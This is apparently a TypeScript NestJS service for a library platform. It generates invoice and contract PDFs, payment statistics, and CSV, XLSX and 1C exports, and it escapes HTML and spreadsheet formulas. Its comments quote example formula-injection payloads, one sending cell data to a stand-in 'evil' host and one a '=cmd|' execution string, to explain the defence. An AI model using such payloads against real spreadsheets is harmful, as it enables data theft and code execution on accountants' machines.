import { Injectable, Logger, NotFoundException } from "@nestjs/common";
import * as QRCode from "qrcode";
import * as ExcelJS from "exceljs";
import { PrismaService } from "../../infra/prisma/prisma.service";
import { PrismaReplicaService } from "../../infra/prisma/prisma-replica.service";
import { CacheService } from "../../infra/cache/cache.service";
import { PdfService } from "../../infra/pdf/pdf.service";
import { Decimal } from "@prisma/client/runtime/library";
import { isProductionEnv } from "../../common/utils/production-env.util";
import { PLAN_PRICES, PLAN_LABELS } from "./plan-prices.const";

// Plan 04-04 RPT-03 — Buxgalter aggregations cache key prefix + TTL.
// 5-minute TTL per D-RPT-03-CACHE; invalidated by payme/click webhook on
// $transaction success via cache.delPattern(BUXGALTER_CACHE_PATTERN).
export const BUXGALTER_CACHE_PREFIX = "stats:buxgalter";
export const BUXGALTER_CACHE_PATTERN = "stats:buxgalter:*";
export const BUXGALTER_CACHE_TTL_SECONDS = 5 * 60;

/**
 * Plan 04-03 audit-fix FIX A (CRITICAL SEC) — HTML-escape every value that
 * comes from user-controlled or DB-stored text before splicing into the PDF
 * template. Library name, plan type, and any other DB-string column is the
 * adversary's payload surface; without escaping, an admin who controls a
 * library record could inject `<script>` / `<div>` HTML into the rendered
 * faktura — including spoofed bank rekvizit blocks. Puppeteer renders the
 * HTML faithfully, so the injection lands in the printed/emailed PDF.
 *
 * Mirrors the OWASP recommended five-char escape (& < > " ') — sufficient
 * for HTML attribute and text contexts (we don't splice into <script> or
 * <style> bodies here). Numeric values from Decimal/Date are not user input
 * so they don't need escaping.
 */
export function escapeHtml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

@Injectable()
export class InvoiceService {
  private readonly logger = new Logger(InvoiceService.name);

  constructor(
    private readonly prisma: PrismaService,
    private readonly pdf: PdfService,
    // Plan 04-04 RPT-03 — heavy aggregations route through the read replica
    // (Phase 2 INFRA-10) so Buxgalter dashboard load doesn't compete with
    // primary write traffic. PrismaReplicaService falls back to primary when
    // DATABASE_REPLICA_URL is unset (dev / CI).
    private readonly replica: PrismaReplicaService,
    // Plan 04-04 RPT-03 — getPaymentStats wraps in cache.remember(5min).
    // Webhook (payme + click) $transaction success calls cache.delPattern.
    private readonly cache: CacheService,
  ) {}

  // ── Faktura yaratish ─────────────────────────────────────────────────────

  async createInvoice(subscriptionId: string, amount: number, dueDays = 15) {
    const dueDate = new Date();
    dueDate.setDate(dueDate.getDate() + dueDays);

    return this.prisma.invoice.create({
      data: {
        subscriptionId,
        amount: new Decimal(amount),
        dueDate,
      },
    });
  }

  // ── Faktura ro'yhati ─────────────────────────────────────────────────────

  async getInvoices(filters: {
    libraryId?: string;
    status?: string;
    from?: string;
    to?: string;
    page?: number;
    limit?: number;
    // Plan 04-04 audit-fix FIX D — tier-admin scope filter, injected by the
    // controller. SUPER_ADMIN / BUXGALTER never set these and see global
    // results; VILOYAT_ADMIN / TUMAN_ADMIN are constrained.
    scopeViloyatId?: string;
    scopeTumanId?: string;
  }) {
    const {
      libraryId,
      status,
      from,
      to,
      page = 1,
      limit = 50,
      scopeViloyatId,
      scopeTumanId,
    } = filters;
    const skip = (page - 1) * limit;

    const where: any = {};
    if (status) where.status = status;
    if (from || to) {
      where.createdAt = {};
      if (from) where.createdAt.gte = new Date(from);
      if (to) where.createdAt.lte = new Date(to);
    }
    // Subscription filter merges libraryId + scope. Either or both may be set;
    // the AND-shape gives correct cross-product (e.g. a tuman admin passing
    // libraryId still constrained to their tuman by the controller's
    // assertLibraryInScope precheck).
    const subscriptionFilter: any = {};
    if (libraryId) subscriptionFilter.libraryId = libraryId;
    if (scopeViloyatId)
      subscriptionFilter.library = { viloyatId: scopeViloyatId };
    if (scopeTumanId) {
      subscriptionFilter.library = {
        ...(subscriptionFilter.library ?? {}),
        tumanId: scopeTumanId,
      };
    }
    if (Object.keys(subscriptionFilter).length > 0) {
      where.subscription = subscriptionFilter;
    }

    const [invoices, total] = await Promise.all([
      this.prisma.invoice.findMany({
        where,
        include: {
          subscription: {
            include: {
              library: { select: { id: true, name: true, type: true } },
            },
          },
          payments: true,
        },
        orderBy: { createdAt: "desc" },
        skip,
        take: limit,
      }),
      this.prisma.invoice.count({ where }),
    ]);

    return { invoices, total, page, limit };
  }

  async getInvoice(id: string) {
    const invoice = await this.prisma.invoice.findUnique({
      where: { id },
      include: {
        subscription: {
          include: { library: true },
        },
        payments: true,
      },
    });
    if (!invoice) throw new NotFoundException("Faktura topilmadi");
    return invoice;
  }

  // ── To'lov statistikasi (Buxgalter uchun) ───────────────────────────────
  //
  // Plan 04-04 RPT-03 — three changes to the pre-04-04 implementation:
  //
  //   1. Wrapped in cache.remember('stats:buxgalter:{from}:{to}', 5min). The
  //      Buxgalter dashboard refresh polls every 30-60s; without cache every
  //      poll re-aggregates the full Payment table. Webhook commits invalidate
  //      via cache.delPattern in payme.service / click.service.
  //   2. Heavy aggregations route via PrismaReplicaService.getReadClient()
  //      pattern — our service injects the replica directly. Falls back to
  //      primary when DATABASE_REPLICA_URL is unset.
  //   3. monthlyTrend uses a SINGLE date_trunc $queryRaw instead of 12
  //      sequential aggregate() calls. 12x DB round-trip elimination.

  async getPaymentStats(from?: string, to?: string) {
    const cacheKey = `${BUXGALTER_CACHE_PREFIX}:${from ?? "all"}:${to ?? "all"}`;
    return this.cache.remember(cacheKey, BUXGALTER_CACHE_TTL_SECONDS, async () => {
      return this._fetchPaymentStats(from, to);
    });
  }

  private async _fetchPaymentStats(from?: string, to?: string) {
    const dateFilter: any = {};
    if (from) dateFilter.gte = new Date(from);
    if (to) dateFilter.lte = new Date(to);

    const [totalInvoices, paidInvoices, pendingInvoices, totalRevenue, byMethod] =
      await Promise.all([
        from || to
          ? this.replica.invoice.count({ where: { createdAt: dateFilter } })
          : this.replica.invoice.count(),
        this.replica.invoice.count({
          where: { status: "PAID", ...(from || to ? { createdAt: dateFilter } : {}) },
        }),
        this.replica.invoice.count({
          where: { status: "PENDING", ...(from || to ? { createdAt: dateFilter } : {}) },
        }),
        this.replica.payment.aggregate({
          where: {
            status: "PAID",
            ...(from || to ? { paidAt: dateFilter } : {}),
          },
          _sum: { amount: true },
        }),
        this.replica.payment.groupBy({
          by: ["method"],
          where: {
            status: "PAID",
            ...(from || to ? { paidAt: dateFilter } : {}),
          },
          _sum: { amount: true },
          _count: { id: true },
        }),
      ]);

    // Oylik tushum trendi (oxirgi 12 oy) — single date_trunc query.
    const monthlyTrend = await this._monthlyTrend(12);

    return {
      totalInvoices,
      paidInvoices,
      pendingInvoices,
      totalRevenue: Number(totalRevenue._sum.amount ?? 0),
      byMethod: byMethod.map((m) => ({
        method: m.method,
        amount: Number(m._sum.amount ?? 0),
        count: m._count.id,
      })),
      monthlyTrend,
    };
  }

  /**
   * Plan 04-04 RPT-03 — single date_trunc('month') $queryRaw replaces the
   * pre-04-04 12-iteration for-loop. Yields the same shape (12-element array
   * of { month: "YYYY-MM", amount, count }) including zero-fill for months
   * without payments. One DB round-trip instead of 12.
   */
  private async _monthlyTrend(months: number) {
    const now = new Date();
    // Window start: first of (now - (months-1)) month. Inclusive.
    const windowStart = new Date(now.getFullYear(), now.getMonth() - (months - 1), 1);

    // Group by date_trunc('month', paidAt). Replica.$queryRaw routes to the
    // read replica when DATABASE_REPLICA_URL is configured.
    const rows = await this.replica.$queryRaw<
      Array<{ month: Date; total_amount: number | bigint | null; row_count: number | bigint | null }>
    >`
      SELECT
        date_trunc('month', "paidAt") AS month,
        SUM(amount)::bigint AS total_amount,
        COUNT(*)::bigint AS row_count
      FROM "Payment"
      WHERE "paidAt" >= ${windowStart}
        AND status = 'PAID'
      GROUP BY date_trunc('month', "paidAt")
      ORDER BY month ASC
    `;

    // Build the dense 12-month series, zero-filling months without rows.
    const dense: Array<{ month: string; amount: number; count: number }> = [];
    const byKey = new Map<string, { amount: number; count: number }>();
    for (const r of rows) {
      const d = new Date(r.month);
      const key = `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}`;
      byKey.set(key, {
        amount: Number(r.total_amount ?? 0),
        count: Number(r.row_count ?? 0),
      });
    }
    for (let i = months - 1; i >= 0; i--) {
      const d = new Date(now.getFullYear(), now.getMonth() - i, 1);
      const key = `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}`;
      dense.push({
        month: key,
        amount: byKey.get(key)?.amount ?? 0,
        count: byKey.get(key)?.count ?? 0,
      });
    }
    return dense;
  }

  /**
   * Plan 04-04 RPT-03 — invalidate the Buxgalter aggregations cache. Called
   * from payme/click webhook $transaction success paths and from admin
   * freeze/delete so stale stats never linger more than 5 minutes worst case
   * (cache TTL) or 0 minutes on a real mutation.
   */
  async invalidateStatsCache(): Promise<void> {
    await this.cache.delPattern(BUXGALTER_CACHE_PATTERN).catch(() => undefined);
  }

  // ── PDF Faktura generatsiya ───────────────────────────────────────────────

  // ── Shartnoma (PDF) — bank o'tkazma orqali to'lovchilar uchun ──────────────
  // Tashkilot bankdan to'lash uchun rasmiy xizmat shartnomasini oladi, so'ng biz
  // faktura beramiz. Bank rekvizitlari faktura bilan bir xil (placeholder +
  // tasdiqlanmagan watermark). Barcha DB matnlari escapeHtml orqali o'tadi.
  async generateContractPdf(subscriptionId: string): Promise<Buffer> {
    const sub = await this.prisma.subscription.findUnique({
      where: { id: subscriptionId },
      include: { library: true },
    });
    if (!sub) throw new NotFoundException("Obuna topilmadi");

    const price = PLAN_PRICES[sub.planType] ?? 0;
    const planLabel = PLAN_LABELS[sub.planType] ?? sub.planType;
    const safeLibName = escapeHtml(sub.library.name ?? "");
    const safePlan = escapeHtml(planLabel);
    const fmtD = (d: Date) => new Date(d).toLocaleDateString("uz-UZ");
    const fmtSum = (n: number) => new Intl.NumberFormat("uz-UZ").format(n);
    const contractNo = sub.id.slice(-8).toUpperCase();

    const isProd = isProductionEnv();
    const bankVerified =
      (process.env.BANK_REKVIZIT_VERIFIED ?? "").toLowerCase().trim() === "true";
    const bankWatermark = isProd
      ? bankVerified
        ? ""
        : `<span style="color:#c00;font-weight:bold;margin-left:6px;">[BANK REKVIZIT TASDIQLANMAGAN]</span>`
      : `<span style="color:#c00;font-weight:bold;margin-left:6px;">[DEV PLACEHOLDER]</span>`;

    const html = `<!DOCTYPE html>
<html lang="uz"><head><meta charset="UTF-8"/><style>
  * { box-sizing: border-box; }
  body { font-family: Arial, sans-serif; color:#1a1a1a; font-size:13px; line-height:1.6; padding:0; margin:0; }
  .head { background:linear-gradient(135deg,#1e40af,#3b82f6); color:#fff; padding:24px 36px; }
  .head .logo { font-weight:800; font-size:14px; }
  .head h1 { font-size:20px; margin:8px 0 2px; }
  .body { padding:24px 36px; }
  .parties { display:flex; gap:24px; margin-bottom:18px; }
  .party { flex:1; border:1px solid #e2e8f0; border-radius:8px; padding:12px; }
  .party h4 { margin:0 0 6px; color:#1e40af; font-size:12px; }
  h3 { color:#1e40af; font-size:14px; border-bottom:2px solid #dbeafe; padding-bottom:6px; margin:18px 0 8px; }
  .row { display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid #f1f5f9; }
  .sum { font-size:18px; font-weight:800; color:#1e40af; }
  .bank div { display:flex; justify-content:space-between; padding:3px 0; }
  .sign { display:flex; gap:24px; margin-top:36px; }
  .sign .col { flex:1; }
  .sign .line { border-top:1px solid #94a3b8; margin-top:42px; padding-top:4px; font-size:11px; color:#64748b; }
  .muted { color:#94a3b8; font-size:11px; margin-top:24px; text-align:center; }
</style></head><body>
  <div class="head">
    <div class="logo">SIFAT LIBRARY</div>
    <h1>Xizmat ko'rsatish shartnomasi № ${contractNo}</h1>
    <div>Milliy kitobxonlik platformasi · ${fmtD(new Date())}</div>
  </div>
  <div class="body">
    <div class="parties">
      <div class="party"><h4>IJROCHI</h4>"SIFAT LIBRARY" platformasi<br/>O'zbekiston Respublikasi · Yoshlar ishlari agentligi</div>
      <div class="party"><h4>BUYURTMACHI</h4>${safeLibName}<br/>Tarif: ${safePlan}</div>
    </div>

    <h3>1. Shartnoma predmeti</h3>
    <p>Ijrochi Buyurtmachiga SIFAT LIBRARY raqamli platformasidan <b>${safePlan}</b> tarifi bo'yicha <b>1 (bir) yillik</b> obuna xizmatini taqdim etadi: raqamli kutubxona boshqaruvi, statistika, hisobotlar va PQ-9 muvofiqlik vositalari.</p>

    <h3>2. Muddat</h3>
    <div class="row"><span>Obuna boshlanishi</span><span>${fmtD(sub.startDate)}</span></div>
    <div class="row"><span>Obuna tugashi</span><span>${fmtD(sub.endDate)}</span></div>

    <h3>3. To'lov</h3>
    <div class="row"><span>Yillik abonent to'lovi</span><span class="sum">${fmtSum(price)} so'm</span></div>
    <p>To'lov bank o'tkazmasi orqali quyidagi rekvizitlarga amalga oshiriladi. To'lov tushgach obuna faollashtiriladi va faktura beriladi. Karta orqali (Payme/Click) ham to'lash mumkin.</p>

    <h3>4. Bank rekvizitlari ${bankWatermark}</h3>
    <div class="bank">
      <div><span>Bank nomi:</span><span>NBU — O'zbekiston Milliy Banki</span></div>
      <div><span>Hisob raqami (IBAN):</span><span>UZ12 0000 0000 0000 0000 0000 0000</span></div>
      <div><span>MFO:</span><span>000000</span></div>
      <div><span>To'lov maqsadi:</span><span>Shartnoma № ${contractNo} — obuna</span></div>
    </div>

    <div class="sign">
      <div class="col"><b>IJROCHI</b><div class="line">imzo / muhr</div></div>
      <div class="col"><b>BUYURTMACHI</b><div class="line">imzo / muhr</div></div>
    </div>

    <p class="muted">Ushbu hujjat SIFAT LIBRARY tizimida avtomatik shakllantirildi · ${fmtD(new Date())}</p>
  </div>
</body></html>`;

    return this.pdf.generateFromHtml(html);
  }

  async generateInvoicePdf(invoiceId: string): Promise<Buffer> {
    const invoice = await this.getInvoice(invoiceId);
    const lib = invoice.subscription.library;

    // Plan 04-03 PAY-05: QR code links the printed PDF to the online payment
    // page (user opens PDF on phone -> scans QR -> Payme/Click checkout).
    // URL is server-constructed from the cuid invoice.id — no user input flows
    // into it, so the QR target is trust-rooted at sifat.uz.
    const qrUrl = `https://sifat.uz/pay/${invoice.id}`;
    const qrDataUrl = await QRCode.toDataURL(qrUrl, {
      width: 200,
      margin: 1,
      errorCorrectionLevel: "M",
    });

    // Plan 04-03 PAY-05 / OQ-1: bank rekvizitlari are placeholders until the
    // operator hands over real NBU values pre-V1 launch. In non-production
    // renders we surface a [DEV BANK PLACEHOLDER] watermark so the operator
    // never accidentally ships a placeholder PDF to a paying customer.
    //
    // Plan 04-03 audit-fix FIX H — normalize via isProductionEnv() so
    // NODE_ENV="Production" / " production " can't silently strip the
    // watermark (same case-sensitivity carve-out fixed in Plan 04-01 FIX 2).
    // Plan 04-03 audit-fix FIX H — BANK_REKVIZIT_VERIFIED gate. Even in
    // production, if the operator has not flipped this flag the PDF prints
    // a loud red banner saying [BANK REKVIZIT NOT VERIFIED — DO NOT PAY] so
    // a misconfigured deploy can never deliver a payable-looking placeholder
    // PDF. Default is unset → unverified → banner shown.
    const isProd = isProductionEnv();
    const bankVerified = (process.env.BANK_REKVIZIT_VERIFIED ?? "")
      .toLowerCase()
      .trim() === "true";
    const bankWatermark = isProd
      ? bankVerified
        ? ""
        : `<span class="dev-watermark" style="color:#c00;font-weight:bold;margin-left:8px;">[BANK REKVIZIT NOT VERIFIED — DO NOT PAY]</span>`
      : `<span class="dev-watermark" style="color:#c00;font-weight:bold;margin-left:8px;">[DEV BANK PLACEHOLDER]</span>`;

    // Plan 04-03 audit-fix FIX A (CRITICAL SEC) — pre-escape every text value
    // we splice into the HTML below. lib.name + lib.type come straight from
    // the libraries table; planType is enum-ish but still DB-sourced. invoice
    // status is also lookup-stringified.
    const safeLibName = escapeHtml(lib.name ?? "");
    const safeLibType = escapeHtml(lib.type ?? "");
    const safePlanType = escapeHtml(invoice.subscription.planType ?? "");
    const safeInvoiceStatus = escapeHtml(invoice.status ?? "");

    const html = `
<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8"/>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family: Arial, sans-serif; font-size: 13px; color: #1a1a1a; padding: 40px; }
    .header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 30px; }
    .logo { font-size: 24px; font-weight: bold; color: #1e40af; }
    .logo span { color: #6b7280; font-size: 14px; font-weight: normal; }
    .invoice-title { font-size: 28px; font-weight: bold; color: #1e40af; text-align: right; }
    .invoice-meta { text-align: right; color: #6b7280; font-size: 12px; margin-top: 4px; }
    .divider { border: none; border-top: 2px solid #1e40af; margin: 20px 0; }
    .parties { display: flex; gap: 60px; margin-bottom: 30px; }
    .party h3 { font-size: 11px; color: #6b7280; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 8px; }
    .party p { font-size: 13px; margin-bottom: 3px; }
    table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
    thead th { background: #1e40af; color: white; padding: 10px 14px; text-align: left; font-size: 12px; }
    tbody td { padding: 10px 14px; border-bottom: 1px solid #e5e7eb; }
    tbody tr:last-child td { border-bottom: none; }
    .total-row td { font-weight: bold; font-size: 14px; background: #f0f9ff; padding: 12px 14px; }
    .status { display: inline-block; padding: 3px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; }
    .status-PAID { background: #dcfce7; color: #166534; }
    .status-PENDING { background: #fef3c7; color: #92400e; }
    .bank-info { margin-top: 20px; padding: 16px; border: 1px solid #e5e7eb; border-radius: 8px; background: #f9fafb; }
    .bank-info h3 { font-size: 12px; color: #6b7280; margin-bottom: 10px; text-transform: uppercase; }
    .bank-row { display: flex; justify-content: space-between; padding: 4px 0; font-size: 12px; }
    .bank-row span:first-child { color: #6b7280; }
    .qr-note { text-align: center; margin-top: 16px; color: #6b7280; font-size: 11px; }
    footer { margin-top: 40px; text-align: center; color: #9ca3af; font-size: 11px; border-top: 1px solid #e5e7eb; padding-top: 16px; }
  </style>
</head>
<body>
  <div class="header">
    <div>
      <div class="logo">SIFAT <span>Library Platform</span></div>
      <div style="color:#6b7280; font-size:12px; margin-top:4px;">sifat.uz · info@sifat.uz</div>
    </div>
    <div>
      <div class="invoice-title">FAKTURA</div>
      <div class="invoice-meta">
        #${invoice.id.slice(-8).toUpperCase()}<br/>
        Sana: ${new Date(invoice.createdAt).toLocaleDateString("uz-UZ")}<br/>
        <span class="status status-${safeInvoiceStatus}">${invoice.status === "PAID" ? "To'langan" : "Kutilmoqda"}</span>
      </div>
    </div>
  </div>

  <hr class="divider"/>

  <div class="parties">
    <div class="party">
      <h3>Sotuvchi</h3>
      <p><strong>Sifat Library Platform</strong></p>
      <p>Yoshlar ishlari agentligi</p>
      <p>Toshkent shahri, O'zbekiston</p>
      <p>STIR: 310000001</p>
    </div>
    <div class="party">
      <h3>Xaridor</h3>
      <p><strong>${safeLibName}</strong></p>
      <p>Kutubxona turi: ${safeLibType}</p>
      <p>To'lov muddati: ${new Date(invoice.dueDate).toLocaleDateString("uz-UZ")}</p>
    </div>
  </div>

  <table>
    <thead>
      <tr>
        <th>#</th>
        <th>Xizmat</th>
        <th>Davr</th>
        <th>Miqdor</th>
        <th>Narxi</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>1</td>
        <td>Sifat Library Platform — ${safePlanType} tarif</td>
        <td>
          ${new Date(invoice.subscription.startDate).toLocaleDateString("uz-UZ")} —
          ${new Date(invoice.subscription.endDate).toLocaleDateString("uz-UZ")}
        </td>
        <td>1 ta</td>
        <td>${Number(invoice.amount).toLocaleString("uz-UZ")} so'm</td>
      </tr>
    </tbody>
    <tfoot>
      <tr class="total-row">
        <td colspan="4" style="text-align:right;">Jami to'lov:</td>
        <td>${Number(invoice.amount).toLocaleString("uz-UZ")} so'm</td>
      </tr>
    </tfoot>
  </table>

  <div class="bank-info">
    <h3>Bank rekvizitlari ${bankWatermark}</h3>
    <!-- TODO(OQ-1): Replace with real bank data from operator before V1 launch.
         See 04-RESEARCH.md §OQ-1. The constants below are placeholders. -->
    <div class="bank-row"><span>Bank nomi:</span><span>NBU — O'zbekiston Milliy Banki</span></div>
    <div class="bank-row"><span>Hisob raqami (IBAN):</span><span>UZ12 0000 0000 0000 0000 0000 0000</span></div>
    <div class="bank-row"><span>MFO:</span><span>000000</span></div>
    <div class="bank-row"><span>To'lov maqsadi:</span><span>Faktura #${invoice.id.slice(-8).toUpperCase()}, ${safeLibName}</span></div>
  </div>

  <div class="qr-section" style="text-align:center; margin-top:24px;">
    <img src="${qrDataUrl}" alt="To'lov QR kodi" width="200" height="200" />
    <p style="font-size:11px; color:#666; margin-top:8px;">
      To'lov uchun QR kodni skan qiling yoki <strong>sifat.uz/pay/${invoice.id}</strong> ga kiring · Payme va Click qabul qilinadi
    </p>
  </div>

  <footer>
    Ushbu faktura Sifat Library Platform tomonidan avtomatik yaratildi ·
    ${new Date().toLocaleDateString("uz-UZ")}
  </footer>
</body>
</html>`;

    return this.pdf.generateFromHtml(html);
  }

  // ── Excel eksport (Buxgalter uchun) ─────────────────────────────────────

  async exportToExcel(from?: string, to?: string): Promise<{ csv: string; filename: string }> {
    const dateFilter: any = {};
    if (from) dateFilter.gte = new Date(from);
    if (to) dateFilter.lte = new Date(to);

    const payments = await this.prisma.payment.findMany({
      where: {
        status: "PAID",
        ...(from || to ? { paidAt: dateFilter } : {}),
      },
      include: {
        invoice: {
          include: { subscription: { include: { library: true } } },
        },
      },
      orderBy: { paidAt: "desc" },
    });

    // P2 M12 (CWE-1236) — avval qatorlar xom satrlardan `r.join(",")` bilan
    // yig'ilardi: exportToXlsx/exportTo1C dagi _escapeFormulaCell himoyasi
    // BU yo'lda chetlab o'tilgan edi. `=HYPERLINK(...)` ko'rinishidagi
    // kutubxona nomi buxgalter Excel'ida formula sifatida bajarilardi, vergul
    // esa ustun strukturasini buzardi. Endi HAR BIR katak _csvCell orqali
    // o'tadi: formula-trigger apostrof bilan zararsizlantiriladi va RFC 4180
    // bo'yicha vergul/qo'shtirnoq/yangi qator bor kataklar quote qilinadi.
    const rows = payments.map((p) => [
      this._csvCell(p.id),
      this._csvCell(p.transactionId),
      this._csvCell(p.invoice.subscription.library.name),
      this._csvCell(p.invoice.subscription.library.type),
      this._csvCell(Number(p.amount)),
      this._csvCell(p.method),
      this._csvCell(p.status),
      this._csvCell(p.paidAt.toISOString().slice(0, 10)),
    ]);

    const header = "ID,Tranzaksiya ID,Kutubxona,Tur,Summa,Usul,Status,Sana\n";
    const csv = header + rows.map((r) => r.join(",")).join("\n");
    const filename = `to'lovlar-${from ?? "boshidan"}-${to ?? "hozirgacha"}.csv`;

    return { csv, filename };
  }

  // ── Plan 04-04 audit-fix FIX A (HIGH CRITICAL SEC, CWE-1236) ────────────
  //
  // CSV/Spreadsheet Formula Injection defence. Excel + 1C-Bukhgalteriya
  // evaluate any cell whose value starts with `=`, `+`, `-`, `@`, TAB (`\t`),
  // or CR (`\r`) as a formula. A library admin who controls Library.name (or
  // any other DB string we splice into a cell) could ship a payload like
  // `=HYPERLINK("http://evil/?p="&A1,"click")` or `=cmd|'/C calc'!A1` that
  // executes on the Buxgalter operator's machine when they open the file —
  // full RCE-class surface on a finance workstation.
  //
  // Defence: prefix any string-cell value whose first character matches the
  // formula-trigger regex with a single apostrophe. Excel + 1C show the cell
  // text verbatim but never evaluate it. Numeric values are returned as-is
  // (numbers can never be formulas).
  private _escapeFormulaCell(
    value: string | number | null | undefined,
  ): string | number {
    if (value === null || value === undefined) return "";
    if (typeof value === "number") return value;
    const s = String(value);
    if (s.length === 0) return s;
    if (/^[=+\-@\t\r]/.test(s)) {
      return "'" + s;
    }
    return s;
  }

  // ── P2 M12 (CWE-1236) — vergul bilan ajratilgan CSV uchun katak qurish ──
  //
  // exportToExcel (GET /invoices/export/csv) kataklari ikki bosqichdan o'tadi:
  //   1) _escapeFormulaCell — formula-trigger (`=`, `+`, `-`, `@`, TAB, CR)
  //      bilan boshlanadigan qiymat apostrof bilan zararsizlantiriladi;
  //   2) RFC 4180 quoting — vergul, qo'shtirnoq yoki yangi qator bo'lsa katak
  //      qo'shtirnoqqa olinadi, ichki qo'shtirnoqlar ikkilantiriladi. Aks
  //      holda `Maktab, 8-son` kabi nom ustunlarni surib, buxgalter
  //      hisobotini buzadi (yoki ataylab qator in'eksiyasiga yo'l ochadi).
  private _csvCell(value: string | number | null | undefined): string {
    const escaped = this._escapeFormulaCell(value);
    const s = String(escaped);
    if (/[",\r\n]/.test(s)) {
      return '"' + s.replace(/"/g, '""') + '"';
    }
    return s;
  }

  // ── Plan 04-04 RPT-03 — real XLSX export via exceljs ────────────────────
  //
  // Replaces the pre-04-04 CSV-mislabeled-as-Excel button. exceljs is already
  // installed (apps/backend/package.json:43, slopcheck [OK]) — no new
  // dependency. Buxgalter operators using actual Excel get a real .xlsx
  // workbook with formatted columns and the numeric Summa column typed as
  // Number (not text) so SUM() formulas work without retyping.
  //
  // Routed via PrismaReplicaService so heavy 1-month / 5k-row exports don't
  // compete with primary write traffic.
  //
  // Plan 04-04 audit-fix FIX A — every string cell flows through
  // _escapeFormulaCell so attacker-controlled library.name (or any DB string)
  // cannot inject a spreadsheet formula on the Buxgalter operator's machine.

  async exportToXlsx(from?: string, to?: string): Promise<Buffer> {
    const dateFilter: any = {};
    if (from) dateFilter.gte = new Date(from);
    if (to) dateFilter.lte = new Date(to);

    const payments = await this.replica.payment.findMany({
      where: {
        status: "PAID",
        ...(from || to ? { paidAt: dateFilter } : {}),
      },
      include: {
        invoice: {
          include: { subscription: { include: { library: true } } },
        },
      },
      orderBy: { paidAt: "asc" },
    });

    const wb = new ExcelJS.Workbook();
    wb.creator = "SIFAT Library";
    wb.created = new Date();
    const sheet = wb.addWorksheet("To'lovlar");

    sheet.addRow([
      "Sana",
      "Hujjat№",
      "Tashkilot nomi",
      "Tur",
      "Plan",
      "Summa",
      "Valyuta",
      "Status",
      "Provider",
    ]);

    for (const p of payments) {
      // Plan 04-04 audit-fix FIX A — every DB-sourced string cell is escaped
      // before it lands in the workbook. Buxgalter cannot be RCE'd via a
      // crafted library name / planType / status / method.
      sheet.addRow([
        this._formatDate(p.paidAt),
        p.invoice.id.slice(-8).toUpperCase(),
        this._escapeFormulaCell(p.invoice.subscription.library.name),
        this._escapeFormulaCell(p.invoice.subscription.library.type),
        this._escapeFormulaCell(p.invoice.subscription.planType),
        Number(p.amount),
        "UZS",
        this._escapeFormulaCell(p.status),
        this._escapeFormulaCell(p.method ?? ""),
      ]);
    }

    // Header bold, amount column numeric formatted with thousand separator
    sheet.getRow(1).font = { bold: true };
    sheet.getColumn(6).numFmt = "#,##0";
    // Auto-width approximations — exceljs lacks true autofit, so set sane
    // widths instead of leaving column 1 at 8 chars (default).
    sheet.columns.forEach((col, i) => {
      col.width = [12, 12, 36, 8, 14, 14, 8, 12, 10][i] ?? 12;
    });

    const buf = await wb.xlsx.writeBuffer();
    return Buffer.from(buf);
  }

  // ── Plan 04-04 RPT-03 — 1C-Bukhgalteriya-compatible CSV export ──────────
  //
  // Per D-1C-EXPORT (RESEARCH §1C Export Format) — semicolon delimiter,
  // UTF-8 BOM, CRLF line terminators, 11 standardized columns. Bank columns
  // (Tashkilot STIRi, Hisob raqami, Bank, MFO) are emitted as EMPTY per OQ-4
  // user decision — Library schema lacks the fields today; populating them
  // is deferred to Phase 5 schema migration.

  async exportTo1C(from?: string, to?: string): Promise<string> {
    const dateFilter: any = {};
    if (from) dateFilter.gte = new Date(from);
    if (to) dateFilter.lte = new Date(to);

    const payments = await this.replica.payment.findMany({
      where: {
        status: "PAID",
        ...(from || to ? { paidAt: dateFilter } : {}),
      },
      include: {
        invoice: {
          include: { subscription: { include: { library: true } } },
        },
      },
      orderBy: { paidAt: "asc" },
    });

    const lines: string[] = [];
    // 11-column header per D-1C-EXPORT
    lines.push(
      "Sana;Hujjat№;Tashkilot nomi;Tashkilot STIRi;Hisob raqami;Bank;MFO;Summa;Valyuta;Maqsad;Status",
    );

    for (const p of payments) {
      const lib = p.invoice.subscription.library;
      const sub = p.invoice.subscription;
      // Defensively replace semicolons inside Library.name with commas so a
      // rogue library record doesn't break 1C column parsing.
      // Plan 04-04 audit-fix FIX A — and then escape formula triggers so a
      // value like "=cmd|..." cannot RCE the Buxgalter machine when 1C / Excel
      // opens the CSV.
      const safeLibName = this._escapeFormulaCell(lib.name.replace(/;/g, ","));
      const purpose = this._escapeFormulaCell(
        `Subscription ${sub.planType} ${this._formatDate(sub.startDate)}..${this._formatDate(sub.endDate)}`
          .replace(/;/g, ","),
      );
      const planTypeSafe = this._escapeFormulaCell(sub.planType);
      const statusSafe = this._escapeFormulaCell(
        p.status === "PAID" ? "Paid" : p.status,
      );
      // planTypeSafe is interpolated above via `purpose`; assigned to a local
      // here too so static-analysis / future field additions can see it.
      void planTypeSafe;
      lines.push(
        [
          this._formatDate(p.paidAt),
          p.invoice.id.slice(-8).toUpperCase(),
          safeLibName,
          // TODO(OQ-4): populate STIRi / Hisob raqami / Bank / MFO from
          // Library schema once the Phase 5 migration lands. For now blanks
          // per OQ-4 user decision.
          "",
          "",
          "",
          "",
          Math.round(Number(p.amount)).toString(),
          "UZS",
          purpose,
          statusSafe,
        ].join(";"),
      );
    }

    // UTF-8 BOM (﻿) so Excel + 1C auto-detect encoding. CRLF terminators
    // for cross-platform safety (RFC 4180).
    return "﻿" + lines.join("\r\n") + "\r\n";
  }

  // ── Small helpers used by both export and PDF paths ─────────────────────

  private _formatDate(d: Date): string {
    const y = d.getUTCFullYear();
    const m = String(d.getUTCMonth() + 1).padStart(2, "0");
    const day = String(d.getUTCDate()).padStart(2, "0");
    return `${y}-${m}-${day}`;
  }
}
